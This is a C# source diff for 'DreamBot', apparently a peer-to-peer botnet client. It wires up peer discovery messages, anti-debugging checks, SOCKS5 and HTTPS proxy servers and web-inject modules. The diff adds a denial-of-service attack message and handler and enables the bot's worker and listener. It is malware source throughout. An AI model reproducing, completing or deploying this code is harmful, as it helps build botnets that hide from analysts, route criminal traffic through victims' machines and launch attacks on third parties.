@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.ComponentModel.Design;
 using DreamBot.Actions.Socks5;
 using DreamBot.Actions.WebInject;
 using DreamBot.Network;
@@ -7,7 +8,9 @@ using DreamBot.Network.Comunication;
 using DreamBot.Network.Comunication.Listeners;
 using DreamBot.Network.Listeners;
 using DreamBot.Network.Protocol.Handlers;
+using DreamBot.Network.Protocol.Handlers.Command;
 using DreamBot.Network.Protocol.Messages;
+using DreamBot.Network.Protocol.Messages.Command;
 using DreamBot.Network.Protocol.Messages.System;
 using DreamBot.Network.Protocol.Peers;
 using DreamBot.System;
@@ -56,8 +59,8 @@ namespace DreamBot
 #endif
 
             _bot = new DreamBotApp(listenPort, id);
-            _bot.Bootstrap(peers);
             _bot.Run();
+            _bot.Bootstrap(peers);
             var c = Console.ReadKey(true);
             while(c.Key != ConsoleKey.Spacebar)
             {
@@ -73,11 +76,16 @@ namespace DreamBot
                 case ConsoleKey.L:
                     _peerList.Dump();
                     break;
+                case ConsoleKey.Help:
+                    //Help();
+                    break;
+                case ConsoleKey.C:
+                    //_peerList.Clear();
+                    break;
             }
         }
 
         private readonly ComunicationManager _comunicationManager;
-        private readonly PeerManager _peersManager;
         private readonly IMessageListener _listener;
         private readonly IWorkScheduler _worker;
         private readonly PeerList _peerList;
@@ -92,7 +100,7 @@ namespace DreamBot
             BotId = id;
             Logger.Info(0, "DreamBot [id: {0}] listenning on port {1}", BotId, port);
 
-            _worker = new ClientWorker();
+            _worker = ClientWorker.Instance;
             _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
             _worker.QueueForever(AntiDebugging.CheckDebugging, TimeSpan.FromSeconds(0.3));
 
@@ -103,19 +111,25 @@ namespace DreamBot
             _listener.UdpPacketReceived += EnqueueMessage;
 
             _comunicationManager = new ComunicationManager(_listener, _worker);
-            _peersManager = new PeerManager(_comunicationManager, _peerList, _worker, BotId);
-            _messagesManager = new MessageManager(_peersManager);
+            var peersManager = new PeerManager(_comunicationManager, _peerList, _worker, BotId);
+            _messagesManager = new MessageManager(peersManager);
 
-            _messagesManager.Register(0x00, MessageType.Request,  typeof(HelloMessage), new HelloMessageHandler(_peerList, _messagesManager), false);
-            _messagesManager.Register(0x01, MessageType.Reply, typeof(HelloReplyMessage), new HelloReplyMessageHandler(_peerList, _messagesManager), true);
-            _messagesManager.Register(0x02, MessageType.Request, typeof(GetPeerListMessage), new GetPeerListMessageHandler(_peerList, _messagesManager), true);
-            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true);
-            _messagesManager.Register(0xFF, MessageType.Special, typeof(InvalidMessage), new InvalidMessageHandler(_peerList), false);
+            // Peer-to-Peer system messages
+            _messagesManager.Register(0x00, MessageType.Request,  typeof(HelloMessage), new HelloMessageHandler(_peerList, _messagesManager), false, 20);
+            _messagesManager.Register(0x01, MessageType.Reply, typeof(HelloReplyMessage), new HelloReplyMessageHandler(_peerList, _messagesManager), true, 10);
+            _messagesManager.Register(0x02, MessageType.Request, typeof(GetPeerListMessage), new GetPeerListMessageHandler(_peerList, _messagesManager), true, 18);
+            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true, 10);
+            //_messagesManager.Register(0x04, MessageType.Request, typeof(PingMessage), new PingMessageHandler(_peerList, _messagesManager), true, 8);
+            //_messagesManager.Register(0x05, MessageType.Reply, typeof(PongMessage), new PongMessageHandler(_peerList, _messagesManager), true,8);
+            _messagesManager.Register(0x06, MessageType.Request, typeof(DosAttackMessage), new DosAttackHandler(_peerList, _messagesManager), true, 0);
+            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true, 10);
+
+            _messagesManager.Register(0xFF, MessageType.Special, typeof(InvalidMessage), new InvalidMessageHandler(_peerList), false, 0);
 
             _socks5 = new Socks5Server(8009);
             _https = new HttpsProxyServer(8019);
-            //_connectivityTester = new ConnectivityTester();
-            //_connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
+            _connectivityTester = new ConnectivityTester();
+//            _connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
         }
 
         private void DesperateModeActivated(object sender, DesparateModeActivatedEventArgs e)
@@ -124,7 +138,7 @@ namespace DreamBot
             foreach (var bot in e.Bots)
             {
                 var hello = new GetPeerListMessage();
-                _messagesManager.Send(hello, bot, 0);
+                _messagesManager.Send(hello, bot);
             }
         }
 
@@ -136,15 +150,15 @@ namespace DreamBot
                 _peerList.TryRegister(peer);
 
                 var hello = new HelloMessage();
-                _messagesManager.Send(hello, peer.BotId, 0);
+                _messagesManager.Send(hello, peer.BotId);
             }
         }
 
         public void Run()
         {
             Logger.Info(0,  "Starting DreamBot");
-//            _worker.Start();
-//            _listener.Start();
+            _worker.Start();
+            _listener.Start();
             _socks5.Start();
             _https.Start();
             Logger.Info(0, "DreamBot is running ;)");
